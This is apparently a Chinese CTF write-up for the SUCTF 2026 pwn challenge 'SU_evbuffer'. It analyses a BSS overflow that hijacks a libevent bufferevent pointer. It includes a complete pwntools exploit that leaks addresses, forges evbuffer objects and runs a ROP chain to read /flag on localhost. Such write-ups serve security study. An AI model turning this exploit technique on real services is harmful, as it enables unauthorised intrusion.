+<p>unk_4078在s_高地址</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773580078300-c6718dce-aedc-4ea4-9127-4479bc691464.png" srcset="/img/loading.gif" lazyload></p>
+<p> 从 TCP 连接（<code>bufferevent</code>）中读取最多 1023 字节到栈缓冲区 <code>src</code></p>
+<p><code>dest</code> 传入的是 <code>**&amp;unk_4078**</code></p>
+<hr>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773580193867-4374b3b2-d771-446c-a775-7e05a1e16aba.png" srcset="/img/loading.gif" lazyload></p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">地址 (BSS)</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">角色</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">状态</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x4040&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;s_&lt;/font&gt;</code></td>
+<td><strong><font style="color:rgb(31, 31, 31);">最佳的 Fake Object 放置点</font></strong><font style="color:rgb(31, 31, 31);">（可以通过 UDP 提前布置）。</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x4078&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;unk_4078&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">TCP 状态结构体。</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x4098&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;unk_4078 + 32&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">必须为 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;1&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 才能进入漏洞分支。</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x40A0&lt;/font&gt;**</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;unk_4078 + 40&lt;/font&gt;</code></td>
+<td><strong><font style="color:rgb(31, 31, 31);">劫持目标</font></strong><font style="color:rgb(31, 31, 31);">（指向伪造对象的指针）。</font></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">绝对地址</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">相对 0x4040 偏移</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">变量含义</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">攻击侧重点</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x4040&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x00&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">UDP 结构 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;s_&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 首地址</font></td>
+<td><strong><font style="color:rgb(31, 31, 31);">Payload 起点</font></strong><font style="color:rgb(31, 31, 31);">，也是放置 Fake Object 的好地方。</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x4070&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x30&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">UDP 监听 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;fd&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">覆盖时需注意，如果填入无效值会导致后续 UDP 发送失败。</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x4078&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x38&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">TCP 结构 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;unk_4078&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">被溢出淹没的目标结构体。</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x4098&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x58&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> (即 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+32&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);">)</font></td>
+<td><font style="color:rgb(31, 31, 31);">Flag 位</font></td>
+<td><strong><font style="color:rgb(31, 31, 31);">必须被覆盖为 </font></strong><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;1&lt;/font&gt;**</code><br/><font style="color:rgb(31, 31, 31);">，以通过 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;sub_13A4&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 的条件检查。</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x40A0&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+0x60&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> (即 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;+40&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);">)</font></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;bufferevent&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);"> 指针</font></td>
+<td><strong><font style="color:rgb(31, 31, 31);">核心劫持点</font></strong><font style="color:rgb(31, 31, 31);">。需要将其覆盖为你伪造的结构体地址（例如 </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;0x4040&lt;/font&gt;</code><br/><font style="color:rgb(31, 31, 31);">）。</font></td>
+</tr>
+</tbody></table>
+<p>after hijeck the 0x40a0,</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773581421440-61b826b1-43f7-42c7-b6de-ce7aa77a56f5.png" srcset="/img/loading.gif" lazyload></p>
+<ol>
+<li>获取 output 缓冲区 (解引用你伪造的指针)</li>
+</ol>
+<p>output &#x3D; bufferevent_get_output(*(_QWORD *)(dest + 40)); </p>
+<ol start="2">
+<li>将新分配的堆块 s 挂载到 output 上</li>
+</ol>
+<p>evbuffer_add_reference(output, (__int64)s, 80LL, (_<em>int64)free</em>, 0LL);</p>
+<p>我们再看看evbuffer_add_reference()函数是干什么的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773581767039-522c2634-1ece-4334-b9c0-b07e1f24b679.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok，分析得差不多了</p>
+<p>总结一下思路</p>
+<p>通过UDP memcpy payload into 0x4040(s_),伪造结构体放ROP（orw)，fd，\x90,dest+32&#x3D;1,*bufferevent-&gt;we need pointer</p>
+<p>先连 TCP8888。触发 <code>sub_16EA</code>，在 BSS 的 <code>0x4078</code> 生成一个合法的状态结构体  </p>
+<p>然后用UDP发payload</p>
+<p>大致如此</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773753624873-5b8afcf3-12be-4fd3-b778-83a271088596.png" srcset="/img/loading.gif" lazyload></p>
+<p>主机名不能太长，不然会出现奇怪的问题</p>
+<p>sudo hostnamectl set-hostname shark</p>
+<p>用这个改</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773754817668-6fe97104-6b28-4552-8437-175f87380edd.png" srcset="/img/loading.gif" lazyload></p>
+<p>wc ,拉个docker更稳定</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773756388468-95961bc4-f9fd-4d89-b8e5-27ab0f2ba93d.png" srcset="/img/loading.gif" lazyload></p>
+<p>环境问题还是太神奇了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773817207978-6a5f56ec-7e20-4a7a-8041-bdb5c8c2b8fd.png" srcset="/img/loading.gif" lazyload></p>
+<p>这才对吗，没想到系统版本还会影响数据泄露（今天是跟evbuffer瞪眼的第5天）</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773821880343-c3ce2630-c060-4452-9855-b7f527648949.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们看看udp和tcp都泄露了什么</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773822145465-0e4affef-aa35-4aea-bcbe-97f06e62a18f.png" srcset="/img/loading.gif" lazyload></p>
+<p>we get pie in udp</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773822544914-2a82b04b-7594-4f88-9f73-167db89c815e.png" srcset="/img/loading.gif" lazyload></p>
+<p>the libevent_base in tcp</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773823847627-2396ef08-ff3e-496e-a9d1-10006b18f485.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok</p>
+<p>我们看看libevent有什么用</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773823197191-be6031c2-f50b-464f-bbdd-8769108e399a.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773824373763-805d1680-935e-4594-8298-bc8b4d6759ee.png" srcset="/img/loading.gif" lazyload></p>
+<p>给题目给的libe改一下名，再patchelf，当然直接用本机的libe也是可以的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773825362986-cecbca8c-3434-4376-b82f-f0f09aed50e3.png" srcset="/img/loading.gif" lazyload></p>
+<p>libe里面还真有gadgets</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773825395021-29c14413-68c1-4629-a648-dbc4a48dcaa8.jpeg" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773826636992-0cb35d2e-cc07-4c03-b56e-3b6cbcf067c2.png" srcset="/img/loading.gif" lazyload></p>
+<p>pwndbg太好用了你知道吗</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773827086438-24dc978a-743b-45af-be6c-95c351abff16.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773827134050-20a9cba9-1cef-4dec-8615-d87484152e4f.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773827161404-f0120a27-0a5c-4b82-b556-db73b01330ab.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773827190355-b9b20e2e-fb2b-4277-b84e-4e5802ca5ce5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我还发现了一个问题</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773827336516-baf1289c-f5f9-4e03-8ae9-9a67dc8690fe.png" srcset="/img/loading.gif" lazyload></p>
+<p>多了0x4</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773827363968-e63cf7ee-1c2c-4062-b7db-b5b2850cc168.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python3<br>from pwn import *<br>context.binary = ELF(&quot;/pwn/SU_evbuffer/pwn&quot;)<br>libe = ELF(&quot;/pwn/SU_evbuffer/libevent-2.1.so.7&quot;)<br>libc = ELF(&quot;/pwn/SU_evbuffer/libc.so.6&quot;)<br>io = remote(&quot;127.0.0.1&quot;,8889, typ=&#x27;udp&#x27;)<br>ip = remote(&quot;127.0.0.1&quot;,8888, typ=&#x27;tcp&#x27;)<br>context.arch = &#x27;amd64&#x27;<br>context.log_level = &#x27;debug&#x27;<br>payload1 = b&quot;127.0.0.3\x00&quot;<br>#payload1+= b&quot;\x90&quot;*24<br>#io.send(payload1.encode())<br>io.send(payload1)<br>data = io.recv(80)<br>print(f&quot;Received &#123;len(data)&#125; bytes&quot;)<br>print(hexdump(data))<br>leak_addr1 = u64(data[0x30:0x38])<br>leak_addr2 = u64(data[0x38:0x40])<br>leak_addr3 = u64(data[0x40:0x48])<br>leak_addr4 = u64(data[0x48:0x50])<br>leak_addr5 = u64(data[0x28:0x30])<br>leak_addr6 = u64(data[0x20:0x28])<br>leak_addr7 = u64(data[0x18:0x20])<br>print(f&quot;泄露的地址1: &#123;hex(leak_addr1)&#125;&quot;)<br>print(f&quot;泄露的地址2: &#123;hex(leak_addr2)&#125;&quot;)<br>print(f&quot;泄露的地址3: &#123;hex(leak_addr3)&#125;&quot;)<br>print(f&quot;泄露的地址4: &#123;hex(leak_addr4)&#125;&quot;)<br>print(f&quot;泄露的地址5: &#123;hex(leak_addr5)&#125;&quot;)<br>print(f&quot;泄露的地址6: &#123;hex(leak_addr6)&#125;&quot;)<br>print(f&quot;泄露的地址7: &#123;hex(leak_addr7)&#125;&quot;)<br>pie_base = leak_addr4 - 0x1619<br>print(f&quot;PIE地址: &#123;hex(pie_base)&#125;&quot;)<br>ip.send(payload1)<br>data1 = ip.recv(80)<br>leak_addr11 = u64(data1[0x30:0x38])<br>leak_addr12 = u64(data1[0x38:0x40])<br>leak_addr13 = u64(data1[0x40:0x48])<br>leak_addr14 = u64(data1[0x48:0x50])<br>leak_addr15 = u64(data1[0x28:0x30])<br>leak_addr16 = u64(data1[0x20:0x28])<br>leak_addr17 = u64(data1[0x18:0x20])<br>print(f&quot;泄露的地址11: &#123;hex(leak_addr11)&#125;&quot;)<br>print(f&quot;泄露的地址12: &#123;hex(leak_addr12)&#125;&quot;)<br>print(f&quot;泄露的地址13: &#123;hex(leak_addr13)&#125;&quot;)<br>print(f&quot;泄露的地址14: &#123;hex(leak_addr14)&#125;&quot;)<br>print(f&quot;泄露的地址15: &#123;hex(leak_addr15)&#125;&quot;)<br>print(f&quot;泄露的地址16: &#123;hex(leak_addr16)&#125;&quot;)<br>print(f&quot;泄露的地址17: &#123;hex(leak_addr17)&#125;&quot;)   <br>print(f&quot;Received &#123;len(data1)&#125; bytes&quot;)<br>print(hexdump(data1))<br>libevent_base = leak_addr17 - 0x137d8<br>print(f&quot;libevent基地址: &#123;hex(libevent_base)&#125;&quot;)<br><br><br><br>io.close()<br>ip.close()<br><br>fd = 11<br>flag_fd = fd + 1<br>def build_payload(fd, flag_fd):<br>    add_rsp_8_ret = pie_base + 0x1012<br>    pop_rdi = pie_base + 0x194B<br>    exit_plt = pie_base + 0x11D0<br>    <br>    pop_rsp_ret = libevent_base + 0xCF2D<br>    pop_rsi = libevent_base + 0xD2E5<br>    pop_rdx_rbx_rbp_r12 = libevent_base + 0x339DD<br>    open_plt = libevent_base + 0xCB24<br>    read_plt = libevent_base + 0xC904<br>    write_plt = libevent_base + 0xC714<br><br>    base_addr = pie_base + 0x4040<br>    fake_bev = pie_base + 0x3F38<br>    fake_ev = pie_base + 0x4140<br>    fake_cb = pie_base + 0x41C0<br>    rop_stack = pie_base + 0x4240<br>    path_addr = pie_base + 0x4380<br>    buf_addr = pie_base + 0x43C0<br><br>    payload = bytearray(b&quot;\x00&quot; * 0x420)<br>    <br>    # overwrite Udp<br>    payload[:10] = b&quot;127.0.0.1\x00&quot;<br>    payload[0x10:0x18] = p64(fake_ev)<br>    payload[0x30:0x34] = p32(6)<br>    payload[0x58:0x5C] = p32(1)<br>    payload[0x60:0x68] = p64(fake_bev)<br><br>    # fake evbuffer<br>    ev_off = 0x100<br>    payload[ev_off+0x10 : ev_off+0x18] = p64(fake_ev)<br>    payload[ev_off+0x18 : ev_off+0x20] = p64((pop_rsp_ret + rop_stack - 0x50) &amp; 0xFFFFFFFFFFFFFFFF)<br>    payload[ev_off+0x20 : ev_off+0x28] = p64(rop_stack - 0x50)<br>    payload[ev_off+0x78 : ev_off+0x80] = p64(fake_cb)<br><br>    # fake callback<br>    cb_off = fake_cb - base_addr<br>    payload[cb_off+0x10 : cb_off+0x18] = p64(add_rsp_8_ret)<br>    payload[cb_off+0x20 : cb_off+0x24] = p32(1)<br><br>    rop = [<br>        pop_rdi, path_addr, pop_rsi, 0, open_plt,<br>        pop_rdi, flag_fd, pop_rsi, buf_addr, pop_rdx_rbx_rbp_r12, 0x80, 0, 0, 0, read_plt,<br>        pop_rdi, fd, pop_rsi, buf_addr, pop_rdx_rbx_rbp_r12, 0x80, 0, 0, 0, write_plt,<br>        pop_rdi, 0, exit_plt<br>    ]<br>    rop_bytes = b&quot;&quot;.join(p64(x) for x in rop)<br>    payload[rop_stack - base_addr : rop_stack - base_addr + len(rop_bytes)] = rop_bytes<br>    <br>    path = b&quot;/flag\x00&quot;<br>    payload[path_addr - base_addr : path_addr - base_addr + len(path)] = path<br>    <br>    return bytes(payload)<br><br>#flag_fd = fd + 1<br>payload = build_payload(fd, flag_fd)<br>io = remote(&quot;127.0.0.1&quot;,8889, typ=&#x27;udp&#x27;)<br>ip = remote(&quot;127.0.0.1&quot;,8888, typ=&#x27;tcp&#x27;)<br>io.send(payload)<br>sleep(0.2)<br>ip.send(b&quot;127.0.0.1\x00&quot;)<br>out = ip.recv(timeout=2.0)<br>print(out)<br>io.close()<br>ip.close()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/SUCTF-2026/1773841267428-3fefdfd8-840a-4f59-bbe2-3f0d22331ac6.png" srcset="/img/loading.gif" lazyload></p>
+<p>wc，终于成了</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SUCTF-Writeup/" class="category-chain-item">SUCTF Writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SUCTF 2026</div>
+      <div>https://ghostshark-pro.github.io/2026/04/23/SUCTF 2026/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>shark</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted</div>
+          <div>2026年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>License</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/23/pwn.college-start&amp;intro%20to%20cybersecurty/" title="pwn.college-start&amp;intro to cybersecurty">
+                        <span class="hidden-mobile">pwn.college-start&amp;intro to cybersecurty</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>TOC</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Grep</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
